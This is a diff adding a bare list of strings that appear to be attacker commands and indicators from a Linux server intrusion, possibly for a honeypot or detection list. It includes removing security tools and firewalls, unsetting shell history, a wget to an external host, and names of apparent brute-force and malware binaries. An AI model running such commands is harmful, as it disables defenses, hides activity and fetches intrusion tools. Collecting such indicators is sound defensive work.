@@ -1,0 +1,21 @@
+/etc/cxs/uninstall.sh
+rm -rf /etc/apache2/conf.d/modsec
+bash /etc/csf/uninstall.sh
+yum remove -y cpanel- clamav
+remove bcm-agent
+mdkri
+unaem 0a
+cd /ev/network/
+unset HISTFILE
+grep -c ^processor /proc/cpuinfo
+/usr/bin/tactu_cpanel
+wget    http://www.curl.by
+cbrute.tgz
+cbrute
+noprofile
+norc
+nuclear.x86
+0xa59ac734/i
+__CMD_DONE_
+export TERM=dumb
+__S_MARK__
